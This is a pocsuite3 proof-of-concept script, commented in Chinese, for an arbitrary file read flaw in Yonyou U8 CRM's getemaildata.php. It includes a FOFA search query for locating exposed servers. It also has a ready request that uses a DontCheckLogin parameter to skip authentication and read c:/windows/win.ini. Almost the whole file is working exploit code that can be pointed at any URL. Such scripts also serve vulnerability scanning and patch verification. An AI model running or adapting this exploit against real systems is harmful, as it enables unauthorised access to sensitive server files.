#!/usr/bin/env python
# coding: utf-8
from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib,base64,json
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-08-12'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-08-12'  # 编写 PoC 的日期
    updateDate = '2023-08-12'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_READ #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        fofa:body="用友U8CRM"
        用友 U8 CRM客户关系管理系统 getemaildata.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取到服务器中的敏感文件
    '''
  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _verify(self):
        result = {}
        path ="/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini"
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/json',
        }
        try:
            resq  = requests.get(url=self.url+path,headers=headers,timeout=5,verify=False)
            if resq.status_code == 200 and ('fonts' in resq.text or 'MAPI=' in resq.text):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = self.url + path
        except Exception as e:
            return
        return self.parse_output(result)         

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)